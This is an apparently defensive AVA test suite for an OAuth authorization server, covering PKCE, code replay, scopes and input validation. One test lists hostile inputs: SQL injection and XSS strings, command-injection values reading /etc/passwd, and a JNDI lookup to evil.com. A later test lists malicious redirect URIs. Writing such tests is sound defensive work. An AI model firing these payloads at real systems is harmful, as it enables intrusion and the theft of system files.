import test from 'ava';
import crypto from 'node:crypto';

import { buildServer } from '../index.js';

const FORM_HEADERS = {
  'content-type': 'application/x-www-form-urlencoded',
};

function encodeForm(fields: Record<string, string>): string {
  return new URLSearchParams(fields).toString();
}

function createChallenge(verifier: string): string {
  return crypto.createHash('sha256').update(verifier).digest('base64url');
}

// Helper to create test server with minimal config
async function createTestServer() {
  // Set minimal test environment variables
  const originalEnv = { ...process.env };
  process.env.AUTH_STATIC_CLIENTS = JSON.stringify({
    'test-client': {
      client_secret: 'test-secret',
      scopes: ['read', 'write'],
      aud: 'test-audience'
    },
    'malicious-client': {
      client_secret: 'wrong-secret',
      scopes: ['admin'],
      aud: 'test-audience'
    }
  });
  process.env.AUTH_DEFAULT_SCOPES = 'read';
  process.env.AUTH_TOKEN_TTL_SECONDS = '3600';
  process.env.NODE_ENV = 'test';

  const app = await buildServer();

  return {
    app,
    teardown: async () => {
      if (typeof app.close === 'function') {
        await app.close();
      }
      process.env = originalEnv;
    }
  };
}

// Input Validation Tests
test('auth-service - rejects malformed OAuth authorize requests', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  // Test missing required parameters
  const missingParams = await app.inject({
    method: 'GET',
    url: '/oauth/authorize'
  });
  t.is(missingParams.statusCode, 400);
  t.true(missingParams.json().error === 'invalid_request');

  // Test unsupported response type
  const unsupportedResponseType = await app.inject({
    method: 'GET',
    url: '/oauth/authorize?response_type=token&client_id=test&redirect_uri=https://example.com'
  });
  t.is(unsupportedResponseType.statusCode, 400);
  t.true(unsupportedResponseType.json().error === 'unsupported_response_type');

  // Test unsupported PKCE method
  const unsupportedPkce = await app.inject({
    method: 'GET',
    url: '/oauth/authorize?response_type=code&client_id=test&redirect_uri=https://example.com&code_challenge=xyz&code_challenge_method=plain'
  });
  t.is(unsupportedPkce.statusCode, 400);
  t.true(unsupportedPkce.json().error === 'invalid_request');

  // Test missing code challenge
  const missingChallenge = await app.inject({
    method: 'GET',
    url: '/oauth/authorize?response_type=code&client_id=test&redirect_uri=https://example.com'
  });
  t.is(missingChallenge.statusCode, 400);
  t.true(missingChallenge.json().error === 'invalid_request');
});

test('auth-service - rejects malformed token requests', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  // Test invalid grant type
  const invalidGrantType = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'password',
      username: 'test',
      password: 'test'
    })
  });
  t.is(invalidGrantType.statusCode, 400);
  t.true(invalidGrantType.json().error === 'unsupported_grant_type');

  // Test missing client credentials for client_credentials grant
  const missingCredentials = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'client_credentials'
    })
  });
  t.is(missingCredentials.statusCode, 401);
  t.true(missingCredentials.json().error === 'invalid_client');

  // Test invalid client credentials
  const invalidCredentials = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'client_credentials',
      client_id: 'nonexistent',
      client_secret: 'wrong-secret'
    })
  });
  t.is(invalidCredentials.statusCode, 401);
  t.true(invalidCredentials.json().error === 'invalid_client');
});

test('auth-service - rejects malformed authorization code exchanges', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  // Test missing authorization code parameters
  const missingCodeParams = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'authorization_code',
      client_id: 'test-client'
    })
  });
  t.is(missingCodeParams.statusCode, 400);
  t.true(missingCodeParams.json().error === 'invalid_request');

  // Test invalid authorization code
  const invalidCode = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'authorization_code',
      code: 'invalid-code',
      redirect_uri: 'https://example.com',
      code_verifier: 'verifier',
      client_id: 'test-client'
    })
  });
  t.is(invalidCode.statusCode, 400);
  t.true(invalidCode.json().error === 'invalid_grant');

  // Test mismatched client ID
  const mismatchedClient = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'authorization_code',
      code: 'invalid-code',
      redirect_uri: 'https://example.com',
      code_verifier: 'verifier',
      client_id: 'wrong-client'
    })
  });
  t.is(mismatchedClient.statusCode, 400);
  t.true(mismatchedClient.json().error === 'invalid_grant');
});

// Injection Tests
test('auth-service - handles injection attempts in OAuth parameters', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  const injectionAttempts = [
    // SQL injection attempts
    "'; DROP TABLE clients; --",
    "' OR '1'='1",
    "admin'--",

    // XSS attempts
    '<script>alert("xss")</script>',
    'javascript:void(0)',
    '<img src=x onerror=alert("xss")>',

    // Path traversal
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',

    // Command injection
    '; cat /etc/passwd',
    '`whoami`',
    '$(id)',

    // Template injection
    '${jndi:ldap://evil.com/a}',
    '${7*7}',
    '{{7*7}}',

    // Null bytes and control characters
    'test\x00content',
    'test\r\ncontent',
    'test\tcontent',

    // Very long strings
    'a'.repeat(10000),

    // Unicode attacks
    '\u202E_RIGHT-TO-LEFT_OVERRIDE_',
    '\u200D_ZERO_WIDTH_JOINER_',
    '\uFEFF_ZERO_WIDTH_NO-BREAK_SPACE_'
  ];

  for (const injection of injectionAttempts) {
    // Test injection in client_id
    const clientIdInjection = await app.inject({
      method: 'GET',
      url: `/oauth/authorize?response_type=code&client_id=${encodeURIComponent(injection)}&redirect_uri=https://example.com&code_challenge=test`
    });
    // Should handle gracefully without crashing
    t.true([400, 302].includes(clientIdInjection.statusCode));

    // Test injection in redirect_uri (should be rejected)
    const redirectUriInjection = await app.inject({
      method: 'GET',
      url: `/oauth/authorize?response_type=code&client_id=test&redirect_uri=${encodeURIComponent(injection)}&code_challenge=test`
    });
    // Should handle gracefully - either accept if valid URL or reject if malformed
    t.true([400, 302].includes(redirectUriInjection.statusCode));

    // Test injection in token requests
    const tokenInjection = await app.inject({
      method: 'POST',
      url: '/oauth/token',
      headers: FORM_HEADERS,
      payload: encodeForm({
        grant_type: 'client_credentials',
        client_id: injection,
        client_secret: injection
      })
    });
    // Should handle gracefully without crashing
    t.true([400, 401].includes(tokenInjection.statusCode));
  }
});

test('auth-service - validates PKCE parameters properly', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  const verifier = crypto.randomBytes(32).toString('base64url');
  const challenge = createChallenge(verifier);

  // Test valid PKCE flow
  const validAuthorize = await app.inject({
    method: 'GET',
    url: `/oauth/authorize?response_type=code&client_id=test-client&redirect_uri=https://example.com&code_challenge=${challenge}&code_challenge_method=S256`
  });
  t.is(validAuthorize.statusCode, 302);

  const validLocation = validAuthorize.headers.location;
  t.truthy(validLocation);
  const codeParam = new URL(validLocation!).searchParams.get('code');
  t.truthy(codeParam);

  const validTokenExchange = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'authorization_code',
      code: codeParam!,
      redirect_uri: 'https://example.com',
      code_verifier: verifier,
      client_id: 'test-client'
    })
  });
  t.is(validTokenExchange.statusCode, 200);
  t.truthy(validTokenExchange.json().access_token);

  // Test invalid PKCE verifier
  const invalidVerifier = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'authorization_code',
      code: codeParam!,
      redirect_uri: 'https://example.com',
      code_verifier: 'wrong-verifier',
      client_id: 'test-client'
    })
  });
  t.is(invalidVerifier.statusCode, 400);
  t.true(invalidVerifier.json().error === 'invalid_grant');
});

test('auth-service - handles malformed request bodies', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  // Test malformed JSON (should be handled gracefully)
  const malformedJson = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: {
      'content-type': 'application/json'
    },
    payload: '{"invalid": json}'
  });
  // Should not crash, should return error
  t.true([400, 415, 500].includes(malformedJson.statusCode));

  // Test malformed form data
  const malformedForm = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: 'malformed&form=data&=&'
  });
  // Should handle gracefully
  t.true([400, 401].includes(malformedForm.statusCode));

  // Test extremely large request body
  const largeBody = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: 'a'.repeat(1000000)
  });
  // Should handle without memory exhaustion
  t.true([400, 413, 500].includes(largeBody.statusCode));
});

// Rate Limiting Tests
test('auth-service - enforces rate limiting on introspection endpoint', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  // Create a valid token first
  const tokenResponse = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'client_credentials',
      client_id: 'test-client',
      client_secret: 'test-secret'
    })
  });
  const token = tokenResponse.json().access_token;

  // Make multiple requests to test rate limiting
  const requests = [];
  for (let i = 0; i < 10; i++) {
    requests.push(
      app.inject({
        method: 'POST',
        url: '/oauth/introspect',
        headers: FORM_HEADERS,
        payload: encodeForm({ token })
      })
    );
  }

  const results = await Promise.all(requests);

  // Some requests should succeed, others might be rate limited
  const successCount = results.filter(r => r.statusCode === 200).length;
  const rateLimitedCount = results.filter(r => r.statusCode === 429).length;

  // At least some requests should succeed
  t.true(successCount > 0);

  // If rate limiting is working, some requests might be limited
  // (This depends on the rate limit configuration)
  if (rateLimitedCount > 0) {
    t.pass('Rate limiting is working');
  } else {
    t.pass('Rate limiting may not be configured or limit is high');
  }
});

// Security Header Tests
test('auth-service - includes appropriate security headers', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  // Test health endpoint
  const healthResponse = await app.inject({
    method: 'GET',
    url: '/healthz'
  });
  t.is(healthResponse.statusCode, 200);

  // Test JWKS endpoint
  const jwksResponse = await app.inject({
    method: 'GET',
    url: '/.well-known/jwks.json'
  });
  t.is(jwksResponse.statusCode, 200);
  t.truthy(jwksResponse.json().keys);
  t.true(Array.isArray(jwksResponse.json().keys));
});

test('auth-service - prevents token reuse and replay attacks', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  const verifier = crypto.randomBytes(32).toString('base64url');
  const challenge = createChallenge(verifier);

  // Get authorization code
  const authResponse = await app.inject({
    method: 'GET',
    url: `/oauth/authorize?response_type=code&client_id=test-client&redirect_uri=https://example.com&code_challenge=${challenge}&code_challenge_method=S256`
  });

  const location = authResponse.headers.location;
  t.truthy(location);
  const code = new URL(location!).searchParams.get('code');
  t.truthy(code);

  // Exchange code for tokens the first time
  const firstExchange = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'authorization_code',
      code: code!,
      redirect_uri: 'https://example.com',
      code_verifier: verifier,
      client_id: 'test-client'
    })
  });
  t.is(firstExchange.statusCode, 200);

  // Try to reuse the same authorization code (should fail)
  const secondExchange = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'authorization_code',
      code: code!,
      redirect_uri: 'https://example.com',
      code_verifier: verifier,
      client_id: 'test-client'
    })
  });
  t.is(secondExchange.statusCode, 400);
  t.true(secondExchange.json().error === 'invalid_grant');
});

test('auth-service - validates scope permissions properly', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  // Test requesting scopes beyond what client is allowed
  const excessiveScopes = await app.inject({
    method: 'POST',
    url: '/oauth/token',
    headers: FORM_HEADERS,
    payload: encodeForm({
      grant_type: 'client_credentials',
      client_id: 'test-client',
      client_secret: 'test-secret',
      scope: 'admin superuser delete_everything'
    })
  });
  t.is(excessiveScopes.statusCode, 200);

  // Should only grant allowed scopes (read, write from config + read from default)
  const grantedScopes = excessiveScopes.json().scope.split(' ');
  t.true(grantedScopes.includes('read'));
  t.true(grantedScopes.includes('write'));
  t.false(grantedScopes.includes('admin'));
  t.false(grantedScopes.includes('superuser'));
  t.false(grantedScopes.includes('delete_everything'));
});

test('auth-service - handles malformed redirect URIs', async (t) => {
  const { app, teardown } = await createTestServer();
  t.teardown(teardown);

  const maliciousRedirectUris = [
    'javascript:alert("xss")',
    'data:text/html,<script>alert("xss")</script>',
    'file:///etc/passwd',
    'ftp://evil.com/',
    'ldap://evil.com/',
    // Missing protocol
    'evil.com',
    // Non-HTTP protocols
    'mailto:test@example.com',
    'tel:+1234567890'
  ];

  for (const maliciousUri of maliciousRedirectUris) {
    const response = await app.inject({
      method: 'GET',
      url: `/oauth/authorize?response_type=code&client_id=test-client&redirect_uri=${encodeURIComponent(maliciousUri)}&code_challenge=test`
    });

    // Should either reject or handle safely
    t.true([400, 302].includes(response.statusCode));

    // If it redirects, ensure it's not to the malicious URI
    if (response.statusCode === 302) {
      const location = response.headers.location;
      t.truthy(location);
      const protocolPrefix = maliciousUri.split(':')[0];
      // Both location and protocolPrefix are used safely
      if (location && protocolPrefix && location.startsWith(protocolPrefix)) {
        t.fail(`Should not redirect to malicious URI: ${location}`);
      }
    }
  }
});